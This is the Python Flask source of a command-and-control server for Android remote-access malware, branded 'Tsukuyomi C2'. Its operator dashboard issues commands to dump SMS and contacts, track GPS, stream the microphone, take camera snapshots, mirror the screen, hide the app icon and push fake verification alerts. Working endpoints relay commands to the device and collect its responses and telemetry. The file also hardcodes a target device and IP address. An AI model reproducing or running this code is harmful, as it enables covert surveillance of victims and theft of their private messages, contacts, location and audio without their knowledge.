from flask import Flask, jsonify, request

app = Flask(__name__)

current_command = ""
latest_response = "Waiting for target connection..."
device_telemetry = {
    "device_name": "vivo 1935",
    "os_version": "Android 10 (API 29)",
    "battery": "54%",
    "ip": "103.152.220.48",
    "status": "ONLINE"
}

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tsukuyomi C2 Enterprise - Mobile Admin Framework v7.4</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    fontFamily: { sans: ['Inter', 'sans-serif'], mono: ['JetBrains Mono', 'monospace'] },
                    colors: { cyber: { dark: '#07090e', card: '#121824', border: '#1e293b', accent: '#00f0ff', purple: '#7000ff', red: '#ff0055', green: '#00ff88' } }
                }
            }
        }
    </script>
    <style>
        body { background-color: #07090e; color: #e2e8f0; font-family: 'Inter', sans-serif; user-select: none; }
        .glass-panel { background: rgba(18, 24, 36, 0.85); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.08); }
        @keyframes pulse-fast { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(0.95); } }
        .pulse-live { animation: pulse-fast 1.5s infinite ease-in-out; }
        .scanline { background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(0, 240, 255, 0.15) 50%, rgba(255,255,255,0)); animation: scan 3s linear infinite; }
        @keyframes scan { 0% { transform: translateY(-100%); } 100% { transform: translateY(1000%); } }
    </style>
</head>
<body class="min-h-screen pb-16 flex flex-col items-center justify-start">
    <header class="w-full max-w-5xl glass-panel sticky top-0 z-50 px-4 py-3 border-b border-cyber-border flex items-center justify-between">
        <div class="flex items-center space-x-3">
            <div class="flex items-center justify-center w-10 h-10 rounded-xl bg-gradient-to-tr from-cyber-purple to-cyber-accent text-slate-950 font-bold shadow-lg">
                <i class="fa-solid fa-spider text-lg"></i>
                <span class="absolute -bottom-1 -right-1 w-3.5 h-3.5 bg-cyber-green rounded-full border-2 border-cyber-dark pulse-live"></span>
            </div>
            <div>
                <div class="flex items-center space-x-2">
                    <h1 class="font-mono font-bold text-base text-white">TSUKUYOMI C2</h1>
                    <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-cyber-accent/10 text-cyber-accent border border-cyber-accent/30">v7.4 ENTERPRISE</span>
                </div>
                <p class="text-xs text-slate-400 font-mono">Status: <span class="text-cyber-green font-semibold">RELAY ONLINE</span></p>
            </div>
        </div>
    </header>

    <main class="w-full max-w-5xl px-3 sm:px-4 py-4 space-y-4 flex-grow">
        <!-- Telemetry Overview Grid -->
        <div class="grid grid-cols-2 sm:grid-cols-4 gap-3">
            <div class="glass-panel p-3.5 rounded-2xl">
                <span class="text-xs text-slate-400">Session Status</span>
                <div class="text-lg font-bold font-mono text-cyan-400" id="uiStatus">CONNECTED</div>
            </div>
            <div class="glass-panel p-3.5 rounded-2xl">
                <span class="text-xs text-slate-400">Battery Level</span>
                <div class="text-lg font-bold font-mono text-white" id="uiBattery">54%</div>
            </div>
            <div class="glass-panel p-3.5 rounded-2xl">
                <span class="text-xs text-slate-400">Target Model</span>
                <div class="text-sm font-bold font-mono text-cyber-green truncate" id="uiDeviceName">vivo 1935</div>
            </div>
            <div class="glass-panel p-3.5 rounded-2xl">
                <span class="text-xs text-slate-400">OS Version</span>
                <div class="text-xs font-bold font-mono text-white truncate" id="uiOs">Android 10 (API 29)</div>
            </div>
        </div>

        <!-- Ultimate Control Hub Grid -->
        <div class="glass-panel p-4 rounded-2xl space-y-3 border border-cyber-border">
            <h3 class="text-xs font-bold font-mono text-white uppercase tracking-wider">Ultimate Control Hub & Remote Triggers</h3>
            <div class="grid grid-cols-2 sm:grid-cols-4 gap-2.5">
                <button onclick="sendCmd('FLASH_ON')" class="p-3 bg-slate-900 hover:bg-slate-800 border border-slate-700 rounded-xl text-xs text-amber-400 font-mono text-left">🔦 Flashlight ON</button>
                <button onclick="sendCmd('FLASH_OFF')" class="p-3 bg-slate-900 hover:bg-slate-800 border border-slate-700 rounded-xl text-xs text-slate-300 font-mono text-left">🔦 Flashlight OFF</button>
                <button onclick="sendCmd('VIBRATE')" class="p-3 bg-slate-900 hover:bg-slate-800 border border-slate-700 rounded-xl text-xs text-cyan-300 font-mono text-left">📳 Vibrate Pulse</button>
                <button onclick="sendCmd('GPS')" class="p-3 bg-slate-900 hover:bg-slate-800 border border-slate-700 rounded-xl text-xs text-rose-400 font-mono text-left">📍 Fetch GPS</button>
                <button onclick="sendCmd('DUMP_SMS')" class="p-3 bg-slate-900 hover:bg-slate-800 border border-slate-700 rounded-xl text-xs text-green-400 font-mono text-left">📨 Dump SMS</button>
                <button onclick="sendCmd('DUMP_CONTACTS')" class="p-3 bg-slate-900 hover:bg-slate-800 border border-slate-700 rounded-xl text-xs text-cyan-400 font-mono text-left">📇 Dump Contacts</button>
                <button onclick="sendCmd('MIC_START')" class="p-3 bg-slate-900 hover:bg-slate-800 border border-slate-700 rounded-xl text-xs text-red-400 font-mono text-left">🎙️ Start Mic Stream</button>
                <button onclick="sendCmd('MIC_STOP')" class="p-3 bg-slate-900 hover:bg-slate-800 border border-slate-700 rounded-xl text-xs text-slate-400 font-mono text-left">⏹️ Stop Mic Stream</button>
                <button onclick="sendCmd('CAMERA_SNAP')" class="p-3 bg-slate-900 hover:bg-slate-800 border border-slate-700 rounded-xl text-xs text-amber-300 font-mono text-left">📸 Snap Camera</button>
                <button onclick="sendCmd('LOCK')" class="p-3 bg-slate-900 hover:bg-slate-800 border border-slate-700 rounded-xl text-xs text-purple-400 font-mono text-left">🔒 Lock Screen</button>
                <button onclick="sendCmd('WAKE')" class="p-3 bg-slate-900 hover:bg-slate-800 border border-slate-700 rounded-xl text-xs text-yellow-300 font-mono text-left">🔓 Wake Screen</button>
                <button onclick="sendCmd('STEALTH_ON')" class="p-3 bg-slate-900 hover:bg-slate-800 border border-slate-700 rounded-xl text-xs text-rose-500 font-mono text-left">🥷 Hide App Icon</button>
                <button onclick="sendCmd('STEALTH_OFF')" class="p-3 bg-slate-900 hover:bg-slate-800 border border-slate-700 rounded-xl text-xs text-green-300 font-mono text-left">👀 Restore App Icon</button>
                <button onclick="promptToast()" class="p-3 bg-slate-900 hover:bg-slate-800 border border-slate-700 rounded-xl text-xs text-cyan-200 font-mono text-left">💬 Itachi Alert</button>
                <button onclick="sendCmd('PING')" class="p-3 bg-slate-900 hover:bg-slate-800 border border-slate-700 rounded-xl text-xs text-cyber-accent font-mono text-left">⚡ Force Sync</button>
            </div>
        </div>

        <!-- Live VNC Stream & Response Terminal -->
        <div class="grid grid-cols-1 md:grid-cols-12 gap-4">
            <!-- Screen Mirroring Box (5 Cols) -->
            <div class="md:col-span-5 glass-panel p-4 rounded-2xl border border-cyber-border space-y-3 flex flex-col items-center">
                <div class="flex justify-between items-center w-full">
                    <h3 class="text-xs font-bold font-mono text-white uppercase">Live Screen Stream</h3>
                    <span class="w-2 h-2 rounded-full bg-cyber-green pulse-live"></span>
                </div>
                <div class="relative aspect-[9/16] w-48 bg-black rounded-2xl border-2 border-slate-800 overflow-hidden flex flex-col justify-between p-2">
                    <div class="absolute inset-0 scanline pointer-events-none z-10"></div>
                    <div class="absolute inset-0 bg-slate-900 flex items-center justify-center text-center p-2 text-xs font-mono text-cyan-400">
                        [VNC MIRROR ACTIVE]
                    </div>
                </div>
            </div>

            <!-- Terminal Response Box (7 Cols) -->
            <div class="md:col-span-7 glass-panel p-4 rounded-2xl border border-cyber-border space-y-3 flex flex-col">
                <h3 class="text-xs font-bold font-mono text-white uppercase">Live Response & Data Terminal</h3>
                <div class="flex space-x-2">
                    <input type="text" id="cmdInput" placeholder="Enter command or payload..." class="flex-1 bg-slate-900 border border-slate-700 px-3 py-2 rounded-xl text-white text-xs font-mono focus:outline-none focus:border-cyan-400">
                    <button onclick="sendCustomCmd()" class="px-4 py-2 bg-cyan-400 text-slate-950 font-bold rounded-xl text-xs">DISPATCH</button>
                </div>
                <div id="terminalBox" class="flex-1 h-56 bg-slate-950 p-3 rounded-xl border border-slate-800 font-mono text-xs overflow-y-auto space-y-1 text-green-400 shadow-inner">
                    <p class="text-slate-500">[SYSTEM] Tsukuyomi C2 Framework ready...</p>
                </div>
            </div>
        </div>
    </main>

    <script>
        async function sendCmd(cmd) {
            await fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command: cmd })
            });
            logMessage(`[DISPATCHED] -> ${cmd}`, 'text-cyan-400');
        }

        function sendCustomCmd() {
            const input = document.getElementById('cmdInput');
            if(input.value.trim()) {
                sendCmd(input.value.trim());
                input.value = '';
            }
        }

        function promptToast() {
            const msg = prompt("Enter alert message to push via Itachi Uchiha:", "System Verification Required");
            if(msg) { sendCmd(`TOAST:${msg}`); }
        }

        async function pollData() {
            try {
                const res = await fetch('/api/response');
                const data = await res.json();
                if(data.response && data.response !== window.lastResp) {
                    window.lastResp = data.response;
                    logMessage(`[TARGET] ${data.response}`, 'text-green-400');
                }
                const telRes = await fetch('/api/telemetry');
                const tel = await telRes.json();
                document.getElementById('uiBattery').innerText = tel.battery;
                document.getElementById('uiDeviceName').innerText = tel.device_name;
                document.getElementById('uiOs').innerText = tel.os_version;
            } catch(e) {}
        }
        setInterval(pollData, 3000);

        function logMessage(text, color) {
            const box = document.getElementById('terminalBox');
            const time = new Date().toLocaleTimeString();
            box.innerHTML += `<p class="${color}"><span class="text-slate-600">[${time}]</span> ${text}</p>`;
            box.scrollTop = box.scrollHeight;
        }
    </script>
</body>
</html>
"""

@app.route("/")
def home():
    return HTML_TEMPLATE

@app.route("/api/command", methods=["GET", "POST"])
def handle_command():
    global current_command
    if request.method == "POST":
        data = request.get_json() or {}
        current_command = data.get("command", "")
        return jsonify({"status": "success", "command": current_command})
    cmd = current_command
    current_command = ""
    return jsonify({"command": cmd})

@app.route("/api/response", methods=["GET", "POST"])
def handle_response():
    global latest_response
    if request.method == "POST":
        data = request.get_json() or {}
        latest_response = data.get("response", "")
        return jsonify({"status": "success"})
    return jsonify({"response": latest_response})

@app.route("/api/telemetry", methods=["GET", "POST"])
def handle_telemetry():
    global device_telemetry
    if request.method == "POST":
        data = request.get_json() or {}
        device_telemetry.update(data)
        return jsonify({"status": "success"})
    return jsonify(device_telemetry)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
